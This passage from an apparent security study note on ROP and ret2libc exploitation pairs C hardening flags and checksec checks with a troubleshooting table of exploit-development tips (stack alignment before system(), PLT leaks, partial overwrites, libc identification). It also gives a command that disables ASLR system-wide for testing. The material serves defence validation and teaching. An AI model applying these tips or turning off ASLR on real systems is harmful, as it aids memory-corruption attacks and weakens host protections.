    fgets(buf, sizeof(buf), stdin);        // GOOD: length-bounded
    scanf("%63s", buf);                    // GOOD: width specifier
}
```

### Compile-Time Flags

```bash
# Enable all modern protections
gcc -o safe_binary source.c \
    -fstack-protector-all \   # stack canary
    -D_FORTIFY_SOURCE=2 \     # runtime bounds checking
    -Wl,-z,relro \            # partial RELRO
    -Wl,-z,now \              # full RELRO (resolve all symbols at load)
    -pie -fPIE                # position-independent executable (enables PIE)

# Verify protections
checksec --file=./safe_binary
```

---

## Common Issues and Solutions

| Problem | Cause | Solution |
|---------|-------|---------|
| Segfault at `movaps` | Stack not 16-byte aligned | Add one extra `ret` gadget before `system()` |
| `puts` output truncated | `\x0a` newline stops `recvline()` | Use `recvuntil(b"\n")` or adjust recv logic |
| Null bytes in address | `\x00` terminates string functions | Use PLT leak or a function that tolerates nulls |
| ASLR bypass fails | Need multiple attempts | Target a forking server; use partial overwrite |
| libc version mismatch | Symbol offsets differ | Use libc-database or libc.rip to identify version |
| `recvline()` blocks | No newline in output | Switch to `recv(timeout=N)` |
| Gadget not found in binary | Gadget absent | Search libc or other loaded libraries |

<!-- detect-validate-19 -->
## ROP Attack Detection and Defense Validation

ROP attacks target *missing stack protection, known addresses, static gadgets, and address leaks*. Defenders must verify **whether canary/NX/PIE shrink the gadget surface** and **whether the exploit reproduces under mitigation toggles**. Validate only in **controlled environments**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Return-address overwrite -> ROP | No stack protection | Canary/NX/CFI | Abnormal ret control flow |
| ret2libc | Known libc address | ASLR/PIE | Direct ret into libc function |
| Gadget chain | Static gadgets | PIE, gadget reduction | Burst of short-sequence rets |
| ASLR bypass (leak) | Address leak | Leak blocking, re-randomization | Exploit right after info leak |

### Defense validation (verify directly)

```bash
# 1) Confirm mitigations are present + measure gadget surface (own binary)
checksec --file=./target 2>/dev/null; ROPgadget --binary ./target | tail -1
#   More "Unique gadgets" = larger ROP surface; without NX, shellcode is even easier
# 2) Toggle ASLR to validate exploit reproducibility (controlled environment only)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space   # for repro; restore to 2 after
```

> The core of ROP defense validation is *whether mitigations actually shrink the surface* -- "we enabled NX/ASLR" differs from "the gadget surface is small and the exploit does not reproduce". Measure directly with checksec, ROPgadget, and ASLR toggling in controlled environments ([[09_Exploit_Techniques]], [[21_Windows_Exploitation]], [[03_System_Hacking]]).
